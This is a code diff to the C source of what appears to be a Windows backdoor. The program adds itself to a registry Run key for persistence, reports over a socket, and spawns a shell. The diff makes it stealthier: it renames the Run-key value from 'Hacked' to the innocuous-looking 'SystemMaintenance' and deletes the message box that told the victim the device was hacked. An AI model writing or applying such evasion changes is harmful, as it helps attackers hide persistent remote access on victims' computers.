@@ -13,6 +13,10 @@
 
 #define bzero(p, size) (void) memset((p), 0, (size))
 
+#ifndef RUNKEY_NAME
+#define RUNKEY_NAME "SystemMaintenance"
+#endif
+
 int sock;
 
 int bootRun()
@@ -35,7 +39,7 @@ int bootRun()
         return -1;
     }
     DWORD pathLenInBytes = pathLen * sizeof(*szPath);
-    if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
+    if (RegSetValueEx(NewVal, TEXT(RUNKEY_NAME), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
         RegCloseKey(NewVal);
         send(sock, err, sizeof(err), 0);
         return -1;
@@ -155,6 +159,5 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
         Sleep(10);
         goto start;
     }
-    MessageBox(NULL, TEXT("Your Device Has Been Hacked!!!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
     Shell();
 }
